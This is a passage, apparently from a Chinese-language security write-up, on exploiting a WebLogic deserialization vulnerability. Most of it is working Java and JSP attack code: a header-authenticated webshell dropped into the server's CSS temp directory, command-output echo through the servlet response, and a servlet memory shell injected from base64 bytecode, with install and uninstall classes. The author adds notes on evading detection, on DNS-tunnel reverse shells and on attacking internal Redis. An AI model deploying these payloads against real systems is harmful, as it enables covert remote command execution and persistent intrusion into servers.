Thread.currentThread()).getCurrentWork(); field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); String temppath = httpConn.getServletRequest().getContext().getTempPath().toString(); File csspath=new File(new File(deploydir,temppath),\u0026#34;war/pages/css/login_page.css\u0026#34;); w(csspath); } catch (Exception e) { throw new RuntimeException(e); } } public void w(File file){ File fjsp=new File(file.getParent(),\u0026#34;hineo4.jsp\u0026#34;); PrintWriter writer = null; try { writer = new PrintWriter(fjsp.getAbsoluteFile(), \u0026#34;UTF-8\u0026#34;); } catch (Exception e) { throw new RuntimeException(e); } String jsp=\u0026#34;\u0026lt;% if(\\\u0026#34;p4ssw0rd!\\\u0026#34;.equals(request.getHeader(\\\u0026#34;x-forwarded-fur\\\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\\\u0026#34;bash\\\u0026#34;,\\\u0026#34;-c\\\u0026#34;,request.getHeader(\\\u0026#34;x-forwarded-far\\\u0026#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\\\u0026#34;\u0026lt;pre\u0026gt;\\\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\\\u0026#34;\u0026lt;/pre\u0026gt;\\\u0026#34;); } %\u0026gt;\u0026#34;; writer.println(jsp); writer.close(); } } wjsp2x.java：精准定位临时目录卸载jsp木马 注意点 可以模拟wjsp2.java的做法删除磁盘上的文件，但需要注意：\n如果在删除文件前访问过webshell，jsp文件就已经转成class，路由也添加了。那么在删除文件只是从磁盘上面删除jsp而已，后门还是可以访问的。 重新上传同名但是内容不同的jsp文件，并不会再编译一次去覆盖已有的class，也就是说无法更新webshell的功能或者密码。 最终效果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package pers.neo; import weblogic.servlet.internal.HttpConnectionHandler; import weblogic.servlet.provider.ContainerSupportProviderImpl; import weblogic.work.ExecuteThread; import java.io.*; public class wjspx2{ public wjspx2(){ String deploydir=System.getProperty(\u0026#34;oracle.deployed.app.dir\u0026#34;); java.lang.reflect.Field field = null; HttpConnectionHandler httpConn = null; try { ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) Thread.currentThread()).getCurrentWork(); field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); String temppath = httpConn.getServletRequest().getContext().getTempPath().toString(); // File jsppath=new File(new File(deploydir,temppath),\u0026#34;/war/pages/css/clickjackingScriptbakup_9ik97.jsp\u0026#34;); File jsppath=new File(new File(deploydir,temppath),\u0026#34;/war/pages/css/hineo.jsp\u0026#34;); jsppath.delete(); } catch (Exception e) { throw new RuntimeException(e); } } } serv.java：通过servlet回显命令执行的结果 探索过程 尝试通过当前线程获取到request对象，向其中写内容来显示命令执行的结果，也正是在这个过程中想到了wjsp2.java的解法。\n尝试直接获取connectionHandler时提示私有属性无法直接获取\n1 2 3 4 5 6 7 8 9 10 11 package pers.neo; import weblogic.servlet.provider.ContainerSupportProviderImpl; import weblogic.work.ExecuteThread; import java.io.ByteArrayInputStream; public class mems { public mems(){ ((ContainerSupportProviderImpl.WlsRequestExecutor)((ExecuteThread) Thread.currentThread()).getCurrentWork()).connectionHandler.getServletRequest().getResponse().getServletOutputStream().writeStream(new ByteArrayInputStream(\u0026#34;hacked!!!\u0026#34;.getBytes())); } } 会报错\n1 java: connectionHandler has private access in weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor 于是尝试通过反射来调用私有变量，成功获取到request对象。\n参考：\nhttps://xz.aliyun.com/t/7740#toc-4\nhttps://paper.seebug.org/1442/#1-cve-2020-14644\n优缺点 优点\n没有文件落地 系统无残留，不需要卸载过程 缺点\n每次执行命令都要触发一次反序列化，动静大，不优雅 存在环境不确定性，可能因为不同版本代码写法不同导致获取不到request对象 最终效果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package pers.neo; import weblogic.servlet.internal.HttpConnectionHandler; import weblogic.servlet.internal.ServletOutputStreamImpl; import weblogic.servlet.internal.ServletResponseImpl; import weblogic.servlet.provider.ContainerSupportProviderImpl; import weblogic.work.ExecuteThread; public class serv { public serv(){ java.lang.reflect.Field field = null; HttpConnectionHandler httpConn = null; ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) Thread.currentThread()).getCurrentWork(); try { field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); ServletResponseImpl resp = httpConn.getServletRequest().getResponse(); String ncmd=httpConn.getServletRequest().getHeader(\u0026#34;x-forwarded-far\u0026#34;); resp.getWriter().write(ncmd+\u0026#34;\\n===========\\n\u0026#34;); String[] cmdarray=new String[]{\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,ncmd}; ServletOutputStreamImpl sos = resp.getServletOutputStream(); sos.writeStream(Runtime.getRuntime().exec(cmdarray).getInputStream()); sos.flush(); resp.getWriter().write(\u0026#34;\\n===========\\n\u0026#34;); } catch (Exception e) { throw new RuntimeException(e); } } } memsi.java：安装内存马 探索过程 这里尝试使用servlet内存马，本质上是先获取到servlet mapping，自定义一个扩展了 javax.servlet.http.HttpServlet 的类，然后往mapping中添加自己定义的路由和处理这个路由的对象。这整个过程都要通过反序列化的操作来实现。\n获取servlet mapping 首先在合适的地方（比如 com.tangosol.internal.util.invoke.RemotableSupport#realize）下断点，尝试获取servlet mapping\n1 2 3 4 5 6 7 8 9 10 11 12 java.lang.reflect.Field field = null; HttpConnectionHandler httpConn = null; ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) Thread.currentThread()).getCurrentWork(); field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); // 获取servletContext WebAppServletContext servletContext = httpConn.getServletRequest().getContext(); // 获取servletMapping Method getServletMapping = servletContext.getClass().getDeclaredMethod(\u0026#34;getServletMapping\u0026#34;); getServletMapping.setAccessible(true); ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext); 成功获取到\n注册servlet 为了方便，使用JVM中已加载了的 oracle.security.am.pbl.transport.http.AMServlet 暂时替代自定义的servlet，尝试注册servlet。成功完成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 String URI = \u0026#34;/pages/css/bluecameby\u0026#34;; Field field = null; HttpConnectionHandler httpConn = null; ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) Thread.currentThread()).getCurrentWork(); field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); // 获取servletContext WebAppServletContext servletContext = httpConn.getServletRequest().getContext(); // 获取servletMapping Method getServletMapping = servletContext.getClass().getDeclaredMethod(\u0026#34;getServletMapping\u0026#34;); getServletMapping.setAccessible(true); ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext); // 使用ServletStub包装HttpServlet Constructor\u0026lt;?\u0026gt; ServletStubImplConstructor = Class.forName(\u0026#34;weblogic.servlet.internal.ServletStubImpl\u0026#34;).getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class); ServletStubImplConstructor.setAccessible(true); HttpServlet httpServlet=new oracle.security.am.pbl.transport.http.AMServlet(); ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, httpServlet, servletContext); // 使用URLMathchHelper包装ServletStub Constructor\u0026lt;?\u0026gt; URLMatchHelperConstructor = Class.forName(\u0026#34;weblogic.servlet.internal.URLMatchHelper\u0026#34;).getDeclaredConstructor(String.class, ServletStubImpl.class); URLMatchHelperConstructor.setAccessible(true); Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub); // 添加到ServletMapping中，即代表注入servlet内存马成功 if (mappings.get(URI) == null){ mappings.put(URI, umh); } 这里遇到了问题，使用oracle.security.am.pbl.transport.http.AMServlet 作为新注册是servlet的处理类的话，可以成功安装和卸载，但使用自定义内嵌类重写get方法则始终不行，无法成功反序列化。不解。\n删除servlet 卸载内存马，成功完成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 String URI = \u0026#34;/pages/css/bluecameby\u0026#34;; Field field = null; HttpConnectionHandler httpConn = null; ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) Thread.currentThread()).getCurrentWork(); field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); // 获取servletContext WebAppServletContext servletContext = httpConn.getServletRequest().getContext(); // 获取servletMapping Method getServletMapping = servletContext.getClass().getDeclaredMethod(\u0026#34;getServletMapping\u0026#34;); getServletMapping.setAccessible(true); ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext); //卸载内存马 if(mappings.get(URI)!=null){ mappings.removePattern(URI); } 使用字节码定义servlet 上面提到直接自定义servlet没有成功，于是尝试使用字节码来加载自定义的servlet。\n自定义一个servlet：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package pers.neo; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class memsHttpServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) { String passwd=req.getHeader(\u0026#34;x-forwarded-fur\u0026#34;); if(!\u0026#34;p4ssw0rd!\u0026#34;.equals(passwd)){return;} String[] cmdarray=new String[]{\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,req.getHeader(\u0026#34;x-forwarded-far\u0026#34;)}; try { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmdarray).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); resp.getWriter().write(s.hasNext() ? s.next() : \u0026#34;\u0026#34;); } catch (Exception e) { throw new RuntimeException(e); } return; } } 生成该servlet对应的字节码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package pers.neo; import com.tangosol.internal.util.invoke.ClassIdentity; import javassist.ClassPool; import javassist.CtClass; import java.util.Base64; public class memsHttpServletGenByteCode { public static void main(String[] args) { ClassPool cp = ClassPool.getDefault(); try { CtClass ctClass = cp.get(memsHttpServlet.class.getName()); String bytecode=Base64.getEncoder().encodeToString(ctClass.toBytecode()); System.out.println(bytecode); } catch (Exception e) { throw new RuntimeException(e); } } } 使用该字节码生成servlet对象\n1 2 3 4 5 String pers_neo_memsHttpServlet_bytecodestr=\u0026#34;yv66vgAAADExxxxxxxxx……\u0026#34;; byte[] code= Base64.getDecoder().decode(pers_neo_memsHttpServlet_bytecodestr); Method defineClass=ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); defineClass.setAccessible(true); HttpServlet memsHttpServlet=(HttpServlet)defineClass.invoke(ClassLoader.getSystemClassLoader(),code,0,code.length); 解决duplicate class definition 发现会报错\n1 loader (instance of com/oracle/classloader/weblogic/LaunchClassLoader): attempted duplicate class definition for name: \u0026#34;pers/neo/memsHttpServlet\u0026#34; 是因为我们之前已经加载过这个类了。不能再使用同一个类名了。\n于是通过反射在每次测试时修改自定义servlet的名称，而不是频繁refactor那个类，以此避免重复定义类的问题。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package pers.neo; import com.tangosol.internal.util.invoke.ClassIdentity; import javassist.ClassPool; import javassist.CtClass; import java.util.Base64; public class memsHttpServletGenByteCode { public static void main(String[] args) { ClassPool cp = ClassPool.getDefault(); try { CtClass ctClass = cp.get(memsHttpServlet.class.getName()); ctClass.replaceClassName(memsHttpServlet.class.getName(), \u0026#34;pers.neo.memsHttpServletb\u0026#34;); //通过反射在每次测试时修改自定义servlet的名称，而不是频繁refactor那个类 String bytecode=Base64.getEncoder().encodeToString(ctClass.toBytecode()); System.out.println(bytecode); } catch (Exception e) { throw new RuntimeException(e); } } } 换一个类名之后就报另一个错了 Cannot cast 'java.lang.Class' to 'javax.servlet.http.HttpServlet' 。\n这是我们的写法不对，不能将一个类cast成另一个类，应该先将他实例化，再将对象转化为其他类的的对象。\n1 2 3 4 5 6 String pers_neo_memsHttpServlet_bytecodestr=\u0026#34;yv66vgAAADExxxxxxxxx……\u0026#34;; byte[] code= Base64.getDecoder().decode(pers_neo_memsHttpServlet_bytecodestr); Method defineClass=ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); defineClass.setAccessible(true); Class memsHttpServlet=(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),code,0,code.length); //类型转换 HttpServlet httpServlet=(HttpServlet)memsHttpServlet.newInstance(); //类型转换 webshell密码判断的写法出错 一切都很好，就是没有结果。原来是因为我比较密码的写法不对，应该使用 .equals 而不是 == 。前者默认是引用比较，后者对基本类型是值比较，对引用类型是引用比较。\n1 2 boolean a= \u0026#34;p4ssw0rd!\u0026#34;==(httpConn.getServletRequest().getHeader(\u0026#34;x-forwarded-fur\u0026#34;)); boolean b= \u0026#34;p4ssw0rd!\u0026#34;.equals(httpConn.getServletRequest().getHeader(\u0026#34;x-forwarded-fur\u0026#34;)); 增强兼容，无限重放 至此已经基本完成了，除了一处缺陷，就是自定义的那个字节码的类每次发送payload都要修改类名，每打一次就要换一个名字，重放请求就会因为加载类失败而报500的错误，因为不能尝试加载全限定名完全相同的类。\n是否能尝试再执行反序列化之前先搜索内存中是否已经有该版本的类？如果可以的话，就可以反复使用同一个请求来增加和删除内存马而不会在内存中留下很多无用的类。\n确实可以，修改代码实现可无限重放安装内存马的请求。可以任意重放而不报错，也便于再卸载内存马之后重新安装。\n1 2 3 4 5 6 7 try{ //in case we may want to replay memsi request 我们会想要重放同一个安装内存马的请求，使用这个try catch可以增强兼容性。 memsHttpServlet=(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),code,0,code.length); }catch (InvocationTargetException e){ memsHttpServlet=Class.forName(\u0026#34;pers.neo.memsHttpServletb\u0026#34;); } HttpServlet httpServlet=(HttpServlet)memsHttpServlet.newInstance(); 至此基本完美。\n优缺点 优点：\n实现任意安装，卸载，稳定而隐秘的命令执行和回显。 缺点：\n最开始觉得是完美的，除了重启JVM会失去shell。 实战告诉我需要还增加流量加密功能，直接将命令暴露在HTTP请求中很容易被检测到。 最终效果 自定义的httpservlet：memsHttpServlet.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package pers.neo; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class memsHttpServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) { String passwd=req.getHeader(\u0026#34;x-forwarded-fur\u0026#34;); if(!\u0026#34;p4ssw0rd!\u0026#34;.equals(passwd)){return;} String[] cmdarray=new String[]{\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,req.getHeader(\u0026#34;x-forwarded-far\u0026#34;)}; try { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmdarray).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); resp.getWriter().write(s.hasNext() ? s.next() : \u0026#34;\u0026#34;); } catch (Exception e) { throw new RuntimeException(e); } return; } } 为httpservlet生成字节码：memsHttpServletGenByteCode.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package pers.neo; import com.tangosol.internal.util.invoke.ClassIdentity; import javassist.ClassPool; import javassist.CtClass; import java.util.Base64; public class memsHttpServletGenByteCode { public static void main(String[] args) { ClassPool cp = ClassPool.getDefault(); try { CtClass ctClass = cp.get(memsHttpServlet.class.getName()); ctClass.replaceClassName(memsHttpServlet.class.getName(), \u0026#34;pers.neo.memsHttpServletb\u0026#34;); String bytecode=Base64.getEncoder().encodeToString(ctClass.toBytecode()); System.out.println(bytecode); } catch (Exception e) { throw new RuntimeException(e); } } } 完整反序列化，安装内存马：memsi.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package pers.neo; import weblogic.servlet.internal.*; import weblogic.servlet.provider.ContainerSupportProviderImpl; import weblogic.servlet.utils.ServletMapping; import weblogic.work.ExecuteThread; import javax.servlet.Servlet; import javax.servlet.http.HttpServlet; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Base64; public class memsi { public memsi(){ String URI = \u0026#34;/pages/css/bluecameby\u0026#34;; java.lang.reflect.Field field = null; HttpConnectionHandler httpConn = null; Class memsHttpServlet=null; try { String pers_neo_memsHttpServlet_bytecodestr=\u0026#34;yv66vgAAADEAbgoAGgAyCAAzCwA0ADUIADYKAAYANwcAOAgAOQgAOggAOwcAPAoAPQA+CgA9AD8KAEAAQQoACgBCCABDCgAKAEQLAEUARgoACgBHCgAKAEgIAEkKAEoASwcATAcATQoAFwBOBwBsBwBQAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABpMcGVycy9uZW8vbWVtc0h0dHBTZXJ2bGV0OwEABWRvR2V0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAGcGFzc3dkAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY21kYXJyYXkBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAFG1lbXNIdHRwU2VydmxldC5qYXZhDAAbABwBAA94LWZvcndhcmRlZC1mdXIHAFEMAFIAUwEADG5lb3M0eWgzbGwwIQwAVABVAQAQamF2YS9sYW5nL1N0cmluZwEABGJhc2gBAAItYwEAD3gtZm9yd2FyZGVkLWZhcgEAEWphdmEvdXRpbC9TY2FubmVyBwBWDABXAFgMAFkAWgcAWwwAXABdDAAbAF4BAAJcQQwAXwBgBwBhDABiAGMMAGQAZQwAZgBnAQAABwBoDABpAGoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MABsAawEAGHBlcnMvbmVvL21lbXNIdHRwU2VydmxldAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABlwZXJzL25lby9tZW1zSHR0cFNlcnZsZXRiAQAbTHBlcnMvbmVvL21lbXNIdHRwU2VydmxldGI7ACEAGQAaAAAAAAACAAEAGwAcAAEAHQAAAC8AAQABAAAABSq3AAGxAAAAAgAeAAAABgABAAAABwAfAAAADAABAAAABQAgAG0AAAAEACIAIwABAB0AAAEAAAUABgAAAHIrEgK5AAMCAE4SBC22AAWaAASxBr0ABlkDEgdTWQQSCFNZBSsSCbkAAwIAUzoEuwAKWbgACxkEtgAMtgANtwAOEg+2ABA6BSy5ABEBABkFtgASmQALGQW2ABOnAAUSFLYAFacADzoFuwAXWRkFtwAYv7EAAQAuAGIAZQAWAAIAHgAAACYACQAAAAoACQALABMADQAuABIARwATAGIAFgBlABQAZwAVAHEAFwAfAAAASAAHAEcAGwAkACUABQBnAAoAJgAnAAUAAAByACAAbQAAAAAAcgAoACkAAQAAAHIAKgArAAIACQBpACwALQADAC4ARAAuAC8ABAABADAAAAACADE=\u0026#34;; byte[] code=Base64.getDecoder().decode(pers_neo_memsHttpServlet_bytecodestr); Method defineClass=ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,byte[].class, int.class, int.class); defineClass.setAccessible(true); try{//in case we may want to replay memsi request memsHttpServlet=(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),code,0,code.length); }catch (InvocationTargetException e){ memsHttpServlet=Class.forName(\u0026#34;pers.neo.memsHttpServletb\u0026#34;); } HttpServlet httpServlet=(HttpServlet)memsHttpServlet.newInstance(); ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) Thread.currentThread()).getCurrentWork(); field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); // 获取servletContext WebAppServletContext servletContext = httpConn.getServletRequest().getContext(); // 获取servletMapping Method getServletMapping = servletContext.getClass().getDeclaredMethod(\u0026#34;getServletMapping\u0026#34;); getServletMapping.setAccessible(true); ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext); // 使用ServletStub包装HttpServlet Constructor\u0026lt;?\u0026gt; ServletStubImplConstructor = Class.forName(\u0026#34;weblogic.servlet.internal.ServletStubImpl\u0026#34;).getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class); ServletStubImplConstructor.setAccessible(true); ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, httpServlet, servletContext); // 使用URLMathchHelper包装ServletStub Constructor\u0026lt;?\u0026gt; URLMatchHelperConstructor = Class.forName(\u0026#34;weblogic.servlet.internal.URLMatchHelper\u0026#34;).getDeclaredConstructor(String.class, ServletStubImpl.class); URLMatchHelperConstructor.setAccessible(true); Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub); ServletResponseImpl resp = httpConn.getServletRequest().getResponse(); ServletOutputStreamImpl sos = resp.getServletOutputStream(); sos.write(String.valueOf(mappings.size()).getBytes()); // 添加到ServletMapping中，即代表注入servlet内存马成功 if (mappings.get(URI) == null){ mappings.put(URI, umh); } sos.write(\u0026#34;==\\n\u0026#34;.getBytes()); sos.write(String.valueOf(mappings.size()).getBytes()); sos.flush(); } catch (Exception e) { e.printStackTrace(); throw new RuntimeException(e); } } } 参考阅读 Weblogic下的servlet内存马注入-无参照纯调试 Weblogic-内存马分析与实现 Java动态加载字节码的方法 memsd.java：卸载内存马 注意点 因为我们在加载自定义httpservlet字节码的时候做了try catch处理，所以可以任意卸载内存马并重新加载。否则的话卸载后需要给httpservlet换一个类名才能加载。 所谓卸载只是将路由去掉，内存中还是存在恶意类的。需要重启JVM才能完全清理。 最终效果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package pers.neo; import weblogic.servlet.internal.*; import weblogic.servlet.provider.ContainerSupportProviderImpl; import weblogic.servlet.utils.ServletMapping; import weblogic.work.ExecuteThread; import java.lang.reflect.Method; public class memsd { public memsd(){ String URI = \u0026#34;/pages/css/bluecameby1\u0026#34;; java.lang.reflect.Field field = null; HttpConnectionHandler httpConn = null; try { ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) Thread.currentThread()).getCurrentWork(); field = gcw.getClass().getDeclaredField(\u0026#34;connectionHandler\u0026#34;); field.setAccessible(true); httpConn = (HttpConnectionHandler) field.get(gcw); // 获取servletContext WebAppServletContext servletContext = httpConn.getServletRequest().getContext(); // 获取servletMapping Method getServletMapping = servletContext.getClass().getDeclaredMethod(\u0026#34;getServletMapping\u0026#34;); getServletMapping.setAccessible(true); ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext); ServletResponseImpl resp = httpConn.getServletRequest().getResponse(); ServletOutputStreamImpl sos = resp.getServletOutputStream(); sos.write(String.valueOf(mappings.size()).getBytes()); //delete pattern from mapping if (mappings.get(URI) != null){ mappings.removePattern(URI); } sos.write(\u0026#34;==\\n\u0026#34;.getBytes()); sos.write(String.valueOf(mappings.size()).getBytes()); sos.flush(); } catch (Exception e) { e.printStackTrace(); throw new RuntimeException(e); } } } 无回显执行命令 回显执行命令 注入内存马 卸载/更新内存马 机器不出网时复用DNS隧道反弹shell 横向攻击内网Redis 一些木马 普通JSP木马 通过请求头传递密码和命令，通过响应打印命令执行的结果。\n1 \u0026lt;% if(\u0026#34;p4ssw0rd!\u0026#34;.equals(request.getHeader(\u0026#34;x-forwarded-fur\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,request.getHeader(\u0026#34;x-forwarded-far\u0026#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } %\u0026gt; 加密流量JSP木马 待需要时实现。思路很简单，只要将异或、base64编码、rot13、AES加密等的进行排列组合即可。\n普通内存马 通过请求头传递密码和命令，通过响应打印命令执行的结果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package pers.neo; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class memsHttpServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) { String passwd=req.getHeader(\u0026#34;x-forwarded-fur\u0026#34;); if(!\u0026#34;p4ssw0rd!\u0026#34;.equals(passwd)){return;} String[] cmdarray=new String[]{\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,req.getHeader(\u0026#34;x-forwarded-far\u0026#34;)}; try { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmdarray).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); resp.getWriter().write(s.hasNext() ? s.next() : \u0026#34;\u0026#34;); } catch (Exception e) { throw new RuntimeException(e); } return; } } 加密流量内存马 待需要时实现。思路很简单，只要将异或、base64编码、rot13、AES加密等的进行排列组合即可。\n修复 调试技巧和常见问题 这是笔者第一次相对深入地调试和利用实用的反序列化漏洞，在这个过程中领悟或学习到了一些有用的知识、方法和技巧，一并总结在此，以飨有需要的读者。\n重置到调用栈某个栈帧 跟踪调试时有时会走过头，可以通过调用栈回溯来到之前的某个栈帧，恢复到当时的执行状态，重新分析。\n回到上一级调用：\n回到之前任意一级的调用：\n有些版本的idea中这个功能通过点击栈信息前面的箭头实现：\n异常断点：如何应对从没有人遇到过的报错 调试有时候会走到人迹罕至的地方，如果遇到一个搜索引擎无法给出满意答复的报错（比如 java.lang.NoClassDefFoundError ），我们不知道是什么引起的，也不知道怎么解决。这个时候可以根据这个报错的异常信息下合适的异常断点，然后复现报错，观察堆栈。\n比如在调试分析-\u0026gt;去除Remotable接口章节中，就是通过下异常断点 java.lang.NoClassDefFoundError 快速重现和分析报错的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 /** * Thrown if the Java Virtual Machine or a \u0026lt;code\u0026gt;ClassLoader\u0026lt;/code\u0026gt; instance * tries to load in the definition of a class (as part of a normal method call * or as part of creating a new instance using the \u0026lt;code\u0026gt;new\u0026lt;/code\u0026gt; expression) * and no definition of the class could be found. * \u0026lt;p\u0026gt; * The searched-for class definition existed when the currently * executing class was compiled, but the definition can no longer be * found. * * @author unascribed * @since JDK1.0 */ 条件断点：限制断点触发场景减少干扰信息 